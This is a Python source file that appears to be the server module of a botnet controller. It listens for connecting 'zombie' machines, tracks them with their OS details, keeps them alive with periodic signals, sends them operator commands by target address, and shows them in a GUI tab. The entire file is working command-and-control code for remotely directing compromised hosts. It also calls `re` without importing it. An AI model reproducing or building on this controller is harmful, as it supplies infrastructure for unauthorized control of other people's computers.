#!/usr/bin/env python3

'''
this script is for starting server for listening and other configs
'''

import socket
from threading import Thread
from colorama import Fore
from modules.communicator import Communicator
from modules.terminal import Terminal
from modules.get_modules import push_text_in_terminal_module,show_error
from tkinter import *
from PIL import Image, ImageTk
from time import sleep
from modules.logger import Logger

serverLogger = Logger(file_name='server')
terminalLogger = Logger(file_name='terminal')

class ServerModule:
    def __init__(self, lip, lport, is_from_gui, terminal_window_box=None, zombies_gui_tab=None):
        self.listening_ip = lip
        self.listening_port = lport
        self.connection_status = 0
        self.zombies_addresses_and_communicators_list = [] # storing clients sockets and their ips [ip:port,communicator,{'os_info':'(OS Info)'}] # hello_back sent
        self.zombies_addresses_and_communicators_list_temp = [] # hello_back message from zombies didn't send yet
        self.default_target = None # this var saves default target for executing commands when -h option is not used
        self.terminal_window_box = terminal_window_box
        self.zombies_gui_tab = zombies_gui_tab
        self.is_from_gui = is_from_gui

    def start_server(self):
        try:
            self.listening_port = int(self.listening_port)
        except ValueError:
            error_text = 'Enter a valid port 1-65535'
            show_error(title='Error', message=error_text, is_from_gui=self.is_from_gui)
            serverLogger.log(text=error_text)
        else:
            if (self.listening_port >= 1 and self.listening_port <= 65535):
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self.server_socket.bind((self.listening_ip, self.listening_port))
                except OSError:
                    error_text = 'Permission denied the selected port is in use by another process select ' \
                                 'another port or use sudo to start program'
                    show_error(title='Bad Port', message=error_text, is_from_gui=self.is_from_gui)
                    serverLogger.log(text=error_text)
                    self.server_socket.close() # close connection if exists
                else:
                    self.server_socket.listen(100)
                    self.connection_status = 1
                    print('Server ' + Fore.GREEN + 'Started' + Fore.RESET +
                          '. ---> ({}:{})'.format(self.listening_ip, self.listening_port))
                    print()
                    serverLogger.log(text='Server Started ---> ({}:{})'.format(self.listening_ip,self.listening_port))
                    self.last_connection_to_close = 0
                    Thread(target=self.accept_connections).start()
                    # yield self.server_socket # return server socket for other usages e.g. closing it
            else:
                error_text = 'Enter a valid port 1-65535'
                show_error(title='Error', message=error_text, is_from_gui=self.is_from_gui)
                serverLogger.log(text=error_text)

    def accept_connections(self):
        Thread(target=self.update_zombies_tab).start()
        while True:
            if not self.connection_status:
                break
            client_socket, client_conn_tuple = self.server_socket.accept()
            if self.last_connection_to_close:
                print('Server ' + Fore.RED + 'Stopped' + Fore.RESET + '.')
                serverLogger.log(text='Server Stopped.')
                print()
                self.last_connection_to_close = 0
                continue

            print('A zombie ' + Fore.GREEN + 'connected' + Fore.RESET +
                  '. --> IP:{}, Port:{}  address-in-terminal={}:{}'.format(client_conn_tuple[0],client_conn_tuple[1]
                                                               , client_conn_tuple[0],client_conn_tuple[1]))

            # create a communicator for sending and receiving messages
            self.create_communicator(client_socket, client_conn_tuple[0],client_conn_tuple[1])

    def create_communicator(self, zombie_socket, ip, port):
        zombie_default_communicator = Communicator(zombie_socket=zombie_socket, zombie_ip=ip, zombie_port=port,
                                                   server_module_class=self)
        print(Fore.YELLOW + 'hello' + Fore.RESET + ' message sent to {}:{}.'.format(ip,port))

        # add zombie ip:port and communicator in temp list (before get hello_back msg) usage: close connection before receive msg
        address_in_terminal_temp = ip + ':' + str(port)  # ip:port
        client_address_and_communicator_temp = [address_in_terminal_temp,zombie_default_communicator]
        self.zombies_addresses_and_communicators_list_temp.append(client_address_and_communicator_temp)

        Thread(target=self.send_hello_signal,
               args=(zombie_default_communicator, (ip,port),)).start()  # send hello signal

        Thread(target=self.send_server_signal, args=(zombie_default_communicator,)).start()

    def send_server_signal(self, communicator):
        '''
        send signal to clients every 5 secs
        '''
        while True:
            sleep(5)
            temp_list = []  # temp list to store communicators of zombies
            for zc in self.zombies_addresses_and_communicators_list:
                temp_list.append(zc[1])

            if communicator not in temp_list: # break loop if zombie has removed
                break

            communicator.send_server_signal()

    def send_hello_signal(self, default_communicator, client_conn_tuple):
        zombie_sent_hello_back = default_communicator.send_hello_signal()

        if zombie_sent_hello_back:
            address_in_terminal = client_conn_tuple[0] + ':' + str(client_conn_tuple[1]) # ip:port
            client_address_and_communicator = [address_in_terminal, default_communicator,
                                               {'os_info':' (OS : Not Detected) '}]
            self.zombies_addresses_and_communicators_list.append(client_address_and_communicator)
            Thread(target=self.get_os, args=(client_address_and_communicator,)).start()

    def get_os(self, client_address_and_communicator):
        communicator = client_address_and_communicator[1]
        os_info = communicator.get_os()
        if os_info:
            index = self.zombies_addresses_and_communicators_list.index(client_address_and_communicator)
            self.zombies_addresses_and_communicators_list[index][2]['os_info'] = ' (OS : {}) '.format(os_info)

    def send_command_from_terminal(self, command, terminal_window_box=None):
        self.terminal_window_box = terminal_window_box
        set_target_pattern = r'!set (.*) "(.*)"'
        command = command.lower()
        if command.startswith('!set'):
            # !set target 192.168.1.23:5656
            set_options = re.findall(set_target_pattern, command) #  [('target','192.168.1.23:5656')]
            if len(set_options) == 1:
                if set_options[0][0].strip() == 'target':
                    self.default_target = set_options[0][1].strip()
                    self.push_text_in_terminal_box(text='Default target is set --> {}'.format(set_options[0][1].strip()))
                else:
                    self.push_text_in_terminal_box(text='Invalid option!')
            else:
                self.push_text_in_terminal_box(text='Invalid option!')
        else:
            terminal = Terminal(terminal_window_box=terminal_window_box, command=command,
                                zombies_addresses_and_communicators_list=self.zombies_addresses_and_communicators_list,
                                default_target=self.default_target,
                                is_from_gui=self.is_from_gui)
            Thread(target=terminal.interpret_command).start()

    def update_zombies_tab(self):
        if not self.is_from_gui:
            return
        while True:
            if not self.connection_status:
                break
            row = 1
            column = 0
            for ac in self.zombies_addresses_and_communicators_list:
                if column == 2:
                    column = 0
                    # create a separator between rows
                    bots_separator = Label(self.zombies_gui_tab)
                    bots_separator.grid(row=row+1)
                    bots_separator.config(bg='#2b313b', state='disabled', font=('Tahoma', 5))
                    row += 2

                image_circle = Image.open("./main/gui/icons/green_circle.png")
                image_circle_resize = ImageTk.PhotoImage(image_circle.resize((30, 30), Image.ANTIALIAS))
                label_image_circle = Label(self.zombies_gui_tab, image=image_circle_resize, bg='#2b313b')
                label_image_circle.image = image_circle_resize
                label_image_circle.grid(row=row, column=column)
                column += 1
                zombie_label = Label(self.zombies_gui_tab, text=ac[0] + ac[2]['os_info'], fg='white', bg='#2b313b', font=('Tahoma', 17))
                zombie_label.grid(row=row, column=column)
                column += 1

            sleep(1)

    def push_text_in_terminal_box(self, text):
        push_text_in_terminal_module(is_from_gui=self.is_from_gui, terminal_window_box=self.terminal_window_box,
                                     text=text)

    def remove_zombie(self, z_address):
        '''
        remove zombie from zombies_addresses_and_communicators_list when:
        the zombie is disconnected
        '''
        for temp_z in self.zombies_addresses_and_communicators_list:
            if z_address == temp_z[0]:
                self.zombies_addresses_and_communicators_list.remove(temp_z)
                self.push_text_in_terminal_box(text=f'Connection with {z_address} closed!')
                break

    def stop_server(self):
        self.connection_status = 0
        self.default_target = None
        for zombie in self.zombies_addresses_and_communicators_list_temp:
            # zombies[1] is communicator in self.zombies_addresses_and_communicators_list, list format --> [ip:port,communicator]
            zombie[1].close_zombie_socket() # close clients sockets

        self.zombies_addresses_and_communicators_list = []
        self.zombies_addresses_and_communicators_list_temp = []
        self.server_socket.close()
        # connect once to localhost to finish last accept waiting
        _close_connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.last_connection_to_close = 1
        try:
            _close_connection_socket.connect((self.listening_ip, self.listening_port))
            _close_connection_socket.close()
        except:
            pass
